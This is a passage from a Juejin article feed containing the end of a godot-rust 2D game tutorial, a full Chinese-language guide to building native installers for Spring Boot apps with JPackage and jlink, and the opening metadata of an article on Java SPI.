<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">ready</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
    ......
    <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>()
        .get_node_as::&lt;Timer&gt;(<span class="hljs-string">"MobTimer"</span>)
        .<span class="hljs-title function_ invoke__">signals</span>()
        .<span class="hljs-title function_ invoke__">timeout</span>()
        .<span class="hljs-title function_ invoke__">connect_other</span>(<span class="hljs-keyword">self</span>, <span class="hljs-keyword">Self</span>::on_mob_timer_timeout);

    <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>()
        .get_node_as::&lt;Timer&gt;(<span class="hljs-string">"ScoreTimer"</span>)
        .<span class="hljs-title function_ invoke__">signals</span>()
        .<span class="hljs-title function_ invoke__">timeout</span>()
        .<span class="hljs-title function_ invoke__">connect_other</span>(<span class="hljs-keyword">self</span>, <span class="hljs-keyword">Self</span>::on_score_timer_timeout);

    <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>()
        .get_node_as::&lt;Timer&gt;(<span class="hljs-string">"StartTimer"</span>)
        .<span class="hljs-title function_ invoke__">signals</span>()
        .<span class="hljs-title function_ invoke__">timeout</span>()
        .<span class="hljs-title function_ invoke__">connect_other</span>(<span class="hljs-keyword">self</span>, <span class="hljs-keyword">Self</span>::on_start_timer_timeout);
}
</code></pre>
<h3 data-id="heading-5">测试主场景</h3>
<p>在<code>ready()</code>最后添加代码：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">ready</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
    <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">new_game</span>();
}
</code></pre>
<p>将<code>main.tscn</code>设置为<strong>主场景</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bda9738abaa04002be250e98553d6f24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=KAr3jpO2PGQPIpNYyp15AYSRezw%3D" alt="main为主场景" loading="lazy"/></p>
<p>如果没有这个选项，说明<code>main</code>已经为主场景。</p>
<p>回忆一下，我们在<code>StartTimer</code>计时结束，也就是<code>2s</code>后才启动的<code>MobTimer</code>，以<code>0.5s</code>速率生成一个<code>Mob</code>，因此测试刚开始时需要耐心稍等第一个的敌人才会出现。</p>
<p>当确认场景没有问题，将<code>self.new_game()</code>从<code>ready()</code>中<strong>删除</strong>，因为我们要在其他地方开始新游戏。</p>
<h2 data-id="heading-6">参考</h2>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.godotengine.org%2Fzh-cn%2F4.5%2Fgetting_started%2Ffirst_2d_game%2Findex.html" target="_blank" title="https://docs.godotengine.org/zh-cn/4.5/getting_started/first_2d_game/index.html" ref="nofollow noopener noreferrer">你的第一个 2D 游戏 — Godot Engine (4.5) 简体中文文档</a></li>
<li><a href="https://juejin.cn/post/7599566082212986932" target="_blank" title="https://juejin.cn/post/7599566082212986932">godot-rust（gdext）创建项目 - 掘金</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.rs%2Fgodot%2F0.4.5%2Fgodot%2F" target="_blank" title="https://docs.rs/godot/0.4.5/godot/" ref="nofollow noopener noreferrer">godot - Rust</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgodot-rust%2Fdemo-projects%2Ftree%2Fmaster%2Fdodge-the-creeps" target="_blank" title="https://github.com/godot-rust/demo-projects/tree/master/dodge-the-creeps" ref="nofollow noopener noreferrer">demo-projects/dodge-the-creeps at master · godot-rust/demo-projects · GitHub</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot + JPackage：构建独立安装包]]></title>    <link>https://juejin.cn/post/7600284420633952297</link>    <guid>https://juejin.cn/post/7600284420633952297</guid>    <pubDate>2026-01-28T23:58:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600284420633952297" data-draft-id="7600296037542428672" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Spring Boot + JPackage：构建独立安装包"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-28T23:58:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风象南"/> <meta itemprop="url" content="https://juejin.cn/user/2524134428655159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Spring Boot + JPackage：构建独立安装包
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524134428655159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风象南
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T23:58:11.000Z" title="Wed Jan 28 2026 23:58:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    46
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>从 JDK 14 开始，Java 官方引入了 <strong>JPackage</strong> 工具（在 JDK 16 正式成为标准功能），它能够将 Java 应用打包成特定平台的原生安装包，<strong>自带定制化的 JRE 运行环境</strong>。这意味着用户无需提前安装 Java 环境，双击安装包即可完成应用部署，极大地简化了交付流程。</p>
<p>本文将介绍如何使用 JPackage 工具将 Spring Boot 项目打包成 Windows、macOS 或 Linux 平台的原生安装包。</p>
<h2 data-id="heading-1">一、JPackage 简介</h2>
<h4 data-id="heading-2">1.1 什么是 JPackage</h4>
<p>JPackage 是 JDK 自带的打包工具，位于 <code>$JAVA_HOME/bin</code> 目录下。它的核心功能是：</p>
<p><strong>生成平台原生安装包</strong>：Windows 的 <code>.exe</code>/<code>.msi</code>、macOS 的 <code>.dmg</code>/<code>.pkg</code>、Linux 的 <code>.deb</code>/<code>.rpm</code></p>
<p><strong>自定义 JRE</strong>：使用 <code>jlink</code> 工具裁剪 JDK，仅打包应用所需的模块，大幅减小安装包体积</p>
<p><strong>简化部署</strong>：用户无需预装 Java 环境，安装包自带运行时</p>
<h4 data-id="heading-3">1.2 JPackage 的优势</h4>

























<table><thead><tr><th>传统部署方式</th><th>JPackage 方式</th></tr></thead><tbody><tr><td>需要预装 JRE/JDK</td><td>自带 JRE，无需额外安装</td></tr><tr><td>环境版本可能不匹配</td><td>绑定特定 JRE 版本，环境一致</td></tr><tr><td>手动编写启动脚本</td><td>自动生成启动器</td></tr><tr><td>跨平台需要多套脚本</td><td>一键生成各平台安装包</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">二、环境准备</h2>
<h4 data-id="heading-5">2.1 JDK 版本要求</h4>
<p><strong>推荐使用 JDK 17 或更高版本</strong>（JPackage 在 JDK 16 才成为标准功能，JDK 17 是 LTS 版本）</p>
<p>确认 JPackage 可用：</p>
<pre><code class="hljs language-bash" lang="bash">jpackage --version
</code></pre>
<h4 data-id="heading-6">2.2 平台特定工具</h4>
<p>根据目标操作系统，需要安装对应的打包工具：</p>
<h5 data-id="heading-7">Windows</h5>
<p><strong>WiX Toolset 3.11+</strong>（用于生成 <code>.msi</code> 安装包）<br/>
下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwixtoolset.org%2F" target="_blank" title="https://wixtoolset.org/" ref="nofollow noopener noreferrer">wixtoolset.org/</a><br/>
安装后将 <code>bin</code> 目录添加到系统环境变量 <code>PATH</code></p>
<h5 data-id="heading-8">macOS</h5>
<p>Xcode 命令行工具（用于生成 <code>.dmg</code>/<code>.pkg</code>）</p>
<pre><code class="hljs language-bash" lang="bash">xcode-select --install
</code></pre>
<h5 data-id="heading-9">Linux</h5>
<p><strong>Debian/Ubuntu</strong>：安装 <code>fakeroot</code></p>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get install fakeroot
</code></pre>
<p><strong>RedHat/CentOS</strong>：安装 <code>rpm-build</code></p>
<pre><code class="hljs language-bash" lang="bash">sudo yum install rpm-build
</code></pre>
<h2 data-id="heading-10">三、Spring Boot 项目准备</h2>
<h4 data-id="heading-11">3.1 示例项目结构</h4>
<p>假设我们有一个标准的 Spring Boot 项目：</p>
<pre><code class="hljs language-css" lang="css">my-springboot-app/
├── <span class="hljs-attribute">src</span>/
│   └── <span class="hljs-selector-tag">main</span>/
│       ├── java/
│       └── resources/
├── pom<span class="hljs-selector-class">.xml</span>
└── target/
    └── my-app-<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span><span class="hljs-selector-class">.jar</span>
</code></pre>
<h4 data-id="heading-12">3.2 构建可执行 JAR</h4>
<p>首先使用 Maven 或 Gradle 构建项目：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Maven</span>
mvn clean package

<span class="hljs-comment"># Gradle</span>
gradle clean build
</code></pre>
<p>确保生成的 JAR 包是可执行的（Spring Boot 默认打包方式）。</p>
<h2 data-id="heading-13">四、使用 JPackage 打包</h2>
<h4 data-id="heading-14">4.1 基础打包命令</h4>
<p>以下是一个基础的 JPackage 命令示例（以 Windows 为例）：</p>
<pre><code class="hljs language-bash" lang="bash">jpackage \
  --input target \
  --name MySpringBootApp \
  --main-jar my-app-1.0.0.jar \
  --main-class org.springframework.boot.loader.JarLauncher \
  --<span class="hljs-built_in">type</span> msi \
  --app-version 1.0.0 \
  --vendor <span class="hljs-string">"我的公司"</span> \
  --description <span class="hljs-string">"基于 Spring Boot 的企业级应用"</span> \
  --icon src/main/resources/app-icon.ico \
  --win-dir-chooser \
  --win-menu \
  --win-shortcut
</code></pre>
<h5 data-id="heading-15">参数说明</h5>

















































<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>--input</code></td><td>输入目录，包含 JAR 包和依赖</td></tr><tr><td><code>--name</code></td><td>应用名称</td></tr><tr><td><code>--main-jar</code></td><td>主 JAR 包文件名</td></tr><tr><td><code>--main-class</code></td><td>主类（Spring Boot 使用 <code>JarLauncher</code>）</td></tr><tr><td><code>--type</code></td><td>安装包类型（<code>msi</code>/<code>exe</code>/<code>dmg</code>/<code>pkg</code>/<code>deb</code>/<code>rpm</code>）</td></tr><tr><td><code>--app-version</code></td><td>应用版本号</td></tr><tr><td><code>--icon</code></td><td>应用图标（Windows 用 <code>.ico</code>，macOS 用 <code>.icns</code>）</td></tr><tr><td><code>--win-dir-chooser</code></td><td>允许用户选择安装目录</td></tr><tr><td><code>--win-menu</code></td><td>创建开始菜单项</td></tr><tr><td><code>--win-shortcut</code></td><td>创建桌面快捷方式</td></tr></tbody></table>
<h4 data-id="heading-16">4.2 自定义 JRE（使用 jlink）</h4>
<p>为了减小安装包体积，可以使用 <code>jlink</code> 裁剪 JRE，仅包含必要的模块。</p>
<h5 data-id="heading-17">步骤 1：查找应用依赖的模块</h5>
<pre><code class="hljs language-bash" lang="bash">jdeps --list-deps target/my-app-1.0.0.jar
</code></pre>
<p>输出示例：</p>
<pre><code class="hljs language-csharp" lang="csharp">java.<span class="hljs-keyword">base</span>
java.logging
java.sql
java.naming
java.desktop
...
</code></pre>
<h5 data-id="heading-18">步骤 2：使用 jlink 创建自定义 JRE</h5>
<pre><code class="hljs language-bash" lang="bash">jlink \
  --add-modules java.base,java.logging,java.sql,java.naming,java.desktop,java.xml,java.management \
  --output custom-jre \
  --strip-debug \
  --no-header-files \
  --no-man-pages \
  --compress=2
</code></pre>
<h5 data-id="heading-19">步骤 3：使用自定义 JRE 打包</h5>
<pre><code class="hljs language-bash" lang="bash">jpackage \
  --input target \
  --name MySpringBootApp \
  --main-jar my-app-1.0.0.jar \
  --main-class org.springframework.boot.loader.JarLauncher \
  --<span class="hljs-built_in">type</span> msi \
  --runtime-image custom-jre \
  --app-version 1.0.0 \
  --vendor <span class="hljs-string">"我的公司"</span>
</code></pre>
<blockquote>
<p><strong>注意</strong>：Spring Boot 应用通常依赖较多模块，建议先不裁剪 JRE，确保功能正常后再优化。</p>
</blockquote>
<hr/>
<h2 data-id="heading-20">五、不同平台的打包示例</h2>
<h4 data-id="heading-21">5.1 Windows 平台（MSI）</h4>
<pre><code class="hljs language-bash" lang="bash">jpackage \
  --input target \
  --name MyApp \
  --main-jar my-app-1.0.0.jar \
  --main-class org.springframework.boot.loader.JarLauncher \
  --<span class="hljs-built_in">type</span> msi \
  --app-version 1.0.0 \
  --icon src/main/resources/app.ico \
  --win-dir-chooser \
  --win-menu \
  --win-shortcut \
  --win-menu-group <span class="hljs-string">"我的应用"</span>
</code></pre>
<h4 data-id="heading-22">5.2 macOS 平台（DMG）</h4>
<pre><code class="hljs language-bash" lang="bash">jpackage \
  --input target \
  --name MyApp \
  --main-jar my-app-1.0.0.jar \
  --main-class org.springframework.boot.loader.JarLauncher \
  --<span class="hljs-built_in">type</span> dmg \
  --app-version 1.0.0 \
  --icon src/main/resources/app.icns \
  --mac-package-name <span class="hljs-string">"com.mycompany.myapp"</span> \
  --mac-package-identifier <span class="hljs-string">"com.mycompany.myapp"</span>
</code></pre>
<h4 data-id="heading-23">5.3 Linux 平台（DEB）</h4>
<pre><code class="hljs language-bash" lang="bash">jpackage \
  --input target \
  --name myapp \
  --main-jar my-app-1.0.0.jar \
  --main-class org.springframework.boot.loader.JarLauncher \
  --<span class="hljs-built_in">type</span> deb \
  --app-version 1.0.0 \
  --icon src/main/resources/app.png \
  --linux-shortcut \
  --linux-menu-group <span class="hljs-string">"Development"</span>
</code></pre>
<hr/>
<h2 data-id="heading-24">六、集成到 Maven 构建流程</h2>
<p>为了自动化打包流程，可以将 JPackage 命令集成到 Maven 的 <code>pom.xml</code> 中。</p>
<h4 data-id="heading-25">6.1 使用 exec-maven-plugin</h4>
<p>在 <code>pom.xml</code> 中添加以下插件配置：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- Spring Boot Maven 插件 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- JPackage 打包插件 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.mojo<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>exec-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>jpackage<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>exec<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">executable</span>&gt;</span>jpackage<span class="hljs-tag">&lt;/<span class="hljs-name">executable</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">arguments</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--input<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>target<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--name<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>MySpringBootApp<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--main-jar<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>${project.build.finalName}.jar<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--main-class<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>org.springframework.boot.loader.JarLauncher<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--type<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>msi<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--app-version<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>${project.version}<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--vendor<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>我的公司<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--win-dir-chooser<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--win-menu<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>--win-shortcut<span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">arguments</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>
</code></pre>
<h4 data-id="heading-26">6.2 执行构建</h4>
<pre><code class="hljs language-bash" lang="bash">mvn clean package
</code></pre>
<p>构建完成后，安装包将生成在项目根目录下。</p>
<h2 data-id="heading-27">七、总结</h2>
<p>JPackage 工具为 Java 应用的分发提供了强大的支持，从简单的命令行操作到集成到自动化构建流程，JPackage 都能很好地满足需求。</p>
<p>在实际项目中，建议根据应用特点选择合适的打包策略，平衡安装包体积、部署便利性和运行性能，为用户提供最佳的使用体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java SPI机制：从原理到实战]]></title>    <link>https://juejin.cn/post/7600316828485009423</link>    <guid>https://juejin.cn/post/7600316828485009423</guid>    <pubDate>2026-01-29T01:15:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600316828485009423" data-draft-id="7600265780349321256" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java SPI机制：从原理到实战"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-29T01:15:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java SPI机制：从原理到实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T01:15:53.000Z" title="Thu Jan 29 2026 01:15:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
